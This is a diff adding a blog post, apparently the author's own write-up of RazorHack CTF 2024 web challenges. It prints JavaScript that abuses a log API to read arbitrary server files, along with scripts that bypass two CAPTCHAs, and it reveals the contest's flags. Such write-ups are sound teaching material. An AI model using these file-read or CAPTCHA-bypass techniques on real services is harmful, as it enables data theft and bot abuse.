+                            the master key, we can get access to the terminal
+                            and finally secure our systems. The problem is the
+                            only copy of the master key is on the server that
+                            the attackers have access to. After all this, it
+                            seems that they have locked it down and we cannot
+                            access any file. Please, this is the last thing I
+                            ask of you...</strong
+                        ></em
+                    >
+                    <em><strong>~ Justin from IT</strong></em>
+                </p>
+                <p><em>Solved: 0/33</em></p>
+                <p>
+                    The final challenge! This one probably the most difficult,
+                    but it does show a lot of cool stuff. This was originally
+                    going to be an XSS attack through the notification system,
+                    but it was too similar to the one in Jungle Calls last year
+                    (doesn&#39;t stop me from reusing other challenges, but I
+                    digress). The Russian comment says:
+                    <strong
+                        >It seems like the master key is just placed in the root
+                        directory of the server application called
+                        &#39;flag&#39;. What a stupid idea! I&#39;ll just, you
+                        know, spread this around to where you can&#39;t find it
+                        so easily...</strong
+                    >.
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\we-will-never-surrender.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    As the comment suggests, we need to read a file called
+                    &#39;flag&#39; on the root server. If we look at the logs
+                    dropdown in the
+                    <em>Account Settings</em> dialog, we see that in order to
+                    fetch the log contents, it sends a file URL to the server.
+                    We can tell because it says <em>logs/[log_name].log</em>,
+                    which hints at a file structure of some sort. We can use
+                    this to access any file on the root server, like so...
+                </p>
+                <pre><code class="language-javascript">const getFile = (file) =&gt; {
+    fetch(&#39;/api/stage8/show_notification&#39;, {
+        method: &#39;post&#39;,
+        headers: {
+            &#39;content-type&#39;: &#39;application/json&#39;
+        },
+        body: JSON.stringify({ file })
+    }).then(response =&gt; response.json())
+    .then(data =&gt; {
+        // ew, data.data.data
+        console.log(data.data.data.map(byte =&gt; String.fromCharCode(byte)).join(&#39;&#39;))
+    })
+}
+
+getFile(&#39;flag&#39;);
+// flag{we
+// c3JjL2FwaS5qcw==
+</code></pre>
+                <p>
+                    This gives us the first part of the flag as well as an
+                    encoded string. If we decode this string from base64, we get
+                    another file path:
+                    <em>src/api.js</em>. We can continue this until we find all
+                    flag parts...
+                </p>
+                <pre><code class="language-javascript">getFile(&#39;src/api.js&#39;);
+// ... some code ...
+// _have_bea
+// aW5kZXguanM= (base64 decode: index.js)
+// ... some code ...
+
+getFile(&#39;index.js&#39;);
+// ... some code ...
+// ten_them
+// cHVibGljL2ltZy9jb25ncmF0cy5wbmc= (base64 decode: public/img/congrats.png)
+// ... some code ...
+
+getFile(&#39;public/img/congrats.png&#39;);
+// it is an image, shown below
+</code></pre>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\congrats.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    To actually get the image file, I wrote another script that
+                    fetches and stores it in a file (written in NodeJS)...
+                </p>
+                <pre><code class="language-javascript">import fs from &#39;node:fs&#39;;
+
+const file = &#39;public/img/congrats.png&#39;;
+
+fetch(&#39;http://razorhack-js-gauntlet-2.chals.io/api/stage8/show_notification&#39;, {
+    method: &#39;post&#39;,
+    headers: {
+        &#39;content-type&#39;: &#39;application/json&#39;,
+        cookie: cookie
+    },
+    body: JSON.stringify({ file })
+})
+.then(response =&gt; response.json())
+.then(data =&gt; {
+    fs.writeFileSync(file, Buffer.from(data.data.data));
+})
+</code></pre>
+                <p>
+                    After all this work, we can compile all the parts together
+                    to get the final flag:
+                    <strong>flag{we_have_beaten_them_14765}</strong>.
+                </p>
+                <p>
+                    I wanted this to be a cool reward after completing the
+                    challenges, as you can see most of the code that handles
+                    what you did. You can even see all the other code if you
+                    wanted to, it just wouldn&#39;t have the flag involved. As
+                    said previously, though, no one made it this far.
+                </p>
+                <hr />
+                <h3
+                    style="text-align: center"
+                    id="were-definitely-doing-this-again"
+                >
+                    hogCAPTCHA
+                </h3>
+
+                <p>
+                    Another thing that was hosted with this web challenge was
+                    two custom CAPTCHAs that both me and my girlfriend
+                    developed. These were not in the same style as JS Gauntlet
+                    2, but since it was hosted on the same container and they
+                    are web challenges, it makes sense to put them here.
+                </p>
+                <p>
+                    Both CAPTCHAs start out with a button that takes them to the
+                    CAPTCHA...
+                </p>
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\hogCAPTCHA-1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    Both were generate with ChatGPT and not created from
+                    scratch, which you can tell if you actually competed at
+                    RazorHack because they were buggy and I had to fix them.
+                </p>
+                <hr />
+                <h3 style="text-align: center" id="hog-captcha-pt1">
+                    hogCAPTCHApt1
+                </h3>
+
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\hogCAPTCHApt1.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    This CAPTCHA consisted of filling in all the words from a
+                    letter given to all the competitors. The letter says:
+                </p>
+                <p>
+                    <strong
+                        >Team, I hope this message finds you securely. You’ve
+                        been briefed on the situation, but I want to make it
+                        clear how delicate this operation is. We are dealing
+                        with a potential insider threat at our nuclear facility,
+                        and the stakes couldn’t be higher. If this individual is
+                        able to compromise any of our core systems—especially
+                        the reactor and cooling stations—the results could be
+                        catastrophic, not just for us, but for everyone in the
+                        surrounding area. Your objective is simple: find the
+                        intruder, confirm their methods, and neutralize the
+                        threat before any real damage is done. The trick is to
+                        do it without alerting them—or anyone else in the
+                        facility. You’ll be working under the guise of routine
+                        system audits and updates, but your real task is much
+                        more critical. You’ll be granted high-level access under
+                        the radar, which should allow you to monitor the plant’s
+                        network traffic and internal communications. We&#39;ve
+                        already identified some data that should help you get
+                        started in your investigation. You’ll need to confirm if
+                        we’re dealing with a skilled saboteur or just someone
+                        testing boundaries. Do not communicate with anyone
+                        outside this team unless absolutely necessary, and if
+                        you need to reach me, use the secure channel we
+                        discussed in the briefing. We need this done quickly,
+                        quietly, and thoroughly. Time is not on our side. Report
+                        any findings directly to me. We can’t afford even the
+                        smallest mistake here. Good luck, and stay invisible.
+                        Shane Barnabas, CIO, RazorPower Co.</strong
+                    >
+                </p>
+                <p>
+                    Each of the input had to be filled correctly, which means
+                    that you had to either a.) look at the physical letter given
+                    and painstakingly copy it down, or b.) make a script because
+                    all the answers were in the code. Some of the bugs include
+                    punctuation being included, which confused people; weird
+                    characters from the letter being included (apparently &#39;
+                    and ’ are not the same character, as is - and —); and the
+                    input not correctly encoding the words the same way as you
+                    type them. And we made this the first challenge of the
+                    entire CTF and you had to complete this before you can try
+                    the other challenges! Luckily, it only took about 5 minutes
+                    to fix, and most people found workarounds, so it wasn&#39;t
+                    the worst thing. After entering all the words, or using the
+                    script below...
+                </p>
+                <pre><code class="language-javascript">document.querySelectorAll(&#39;input&#39;).forEach(input =&gt; {
+    input.value = input.getAttribute(&#39;data-answer&#39;);
+});
+</code></pre>
+                <p>
+                    ...you will get the flag:
+                    <strong>flag{f1rst_fl4g_0f_th3-d4y!}</strong>.
+                </p>
+                <hr />
+                <h3 style="text-align: center" id="hog-captcha-pt2">
+                    hogCAPTCHApt2
+                </h3>
+
+                <div style="text-align: center">
+                    <img
+                        src="\static\res\blog\razorhack-ctf-2024\hogCAPTCHApt2.jpg"
+                        style="text-align: center"
+                    />
+                </div>
+                <p>
+                    This is probably the worst CTF challenge I have ever made.
+                    Made with ChatGPT and not much care, this challenge straight
+                    up didn&#39;t work. Some of it is not my fault, though. In
+                    this challenge, you need to click all pixels that have a
+                    blue component that is greater than 100, so all you would
+                    need to do is run a script that does it for you, right?
+                    I&#39;ve made so many challenges like this, and they all
+                    seem to work, so why not this one? Well, I thought so to. In
+                    fact, here is a script that worked for me...
+                </p>
+                <pre><code class="language-javascript">indexes = []
+imageData = document.querySelector(&#39;canvas&#39;).getContext(&#39;2d&#39;).getImageData(0, 0, 200, 200);
+for (let y = 0; y &lt; canvas.height; y++) {
+    for (let x = 0; x &lt; canvas.width; x++) {
+        let index = 4 * (y * canvas.width + x);
+        if (imageData.data[index + 2] &gt; 100) indexes.push(index / 4)
+    }
+}
+clickedPixels = new Set(indexes)
+</code></pre>
+                <p>
+                    This, along with clicking once on the image shows the flag
+                    for me:
+                    <strong>flag{pr33ty_c0l0rs!!!}</strong>. Key words:
+                    <em>FOR ME</em>. For some reason, this code would not
+                    consistenly work on other people&#39;s devices. First, I
+                    tried simulating clicks through the event dispatcher, which
+                    didn&#39;t work consistently. Then, Firefox and
+                    Chromium-based browsers handle images on canvases
+                    differently, meaning that there would be different pixels
+                    that would be clicked on each browser. Then, even with the
+                    same settings and everything, some computers just didn&#39;t
+                    get the right answer, even with the same script! I just
+                    decided that it wasn&#39;t worth it and just gave anyone
+                    whose answer looks correct the flag manually, which kinda
+                    sucks.
+                </p>
+                <hr />
+                <h3 style="text-align: center" id="conclusion">Conclusion</h3>
+
+                <p>
+                    I think in terms of last year, this year went way better.
+                    The hosting wasn&#39;t a problem, the challenges (mostly)
+                    didn&#39;t have breaking bugs. I didn&#39;t stay up until
+                    3am the night before creating these challenges. I would say
+                    it went off without a hitch. I do wish that more people
+                    completed the challenges as I did like the further ones I
+                    did, but at least people can see it in the blog post now.
+                    Thanks for reading if you made it this far!
+                </p>
+            </article>
+
+            <footer class="footer-custom">
+                <section
+                    class="d-flex justify-content-center justify-content-lg-between p-4"
+                >
+                    <div class="text-start">
+                        <a
+                            href="https://youtube.com/CodingAP"
+                            class="lead glowing-link"
+                        >
+                            <i class="fab fa-youtube"></i>
+                        </a>
+                        <a
+                            href="https://twitter.com/Coding_AP"
+                            class="lead glowing-link"
+                        >
+                            <i class="fab fa-twitter"></i>
+                        </a>
+                        <a
+                            href="https://www.linkedin.com/in/alex-prosser-a8524a221/"
+                            class="lead glowing-link"
+                        >
+                            <i class="fab fa-linkedin"></i>
+                        </a>
+                        <a
+                            href="https://github.com/CodingAP"
+                            class="lead glowing-link"
+                        >
+                            <i class="fab fa-github"></i>
+                        </a>
+                        <br />
+                        <a
+                            class="glowing-link"
+                            onclick="document.body.scrollTop = 0; document.documentElement.scrollTop = 0;"
+                        >
+                            Back to top
+                        </a>
+                    </div>
+
+                    <div class="text-end">
+                        <a class="glowing-link" href="https://discord.com"
+                            >AP#1519</a
+                        ><br />
+                        <a
+                            class="glowing-link"
+                            href="mailto:alex.prosser.uark@gmail.com"
+                            >alex.prosser.uark@gmail.com</a
+                        ><br />
+                        <span class="glowing"
+                            >© 2023 Copyright - Alex Prosser</span
+                        >
+                    </div>
+                </section>
+            </footer>
+        </div>
+
+        <script
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.bundle.min.js"
+            integrity="sha384-u1OknCvxWvY5kfmNBILK2hRnQC3Pr17a+RTT6rIHI7NnikvbZlHgTPOOmMi466C8"
+            crossorigin="anonymous"
+        ></script>
+        <script
+            src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
+            integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
+            crossorigin="anonymous"
+        ></script>
+        <script
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.min.js"
+            integrity="sha384-7VPbUDkoPSGFnVtYi0QogXtr74QeVeeIs99Qfg5YCF+TidwNdjvaKZX19NZ/e6oz"
+            crossorigin="anonymous"
+        ></script>
+    </body>
+</html>
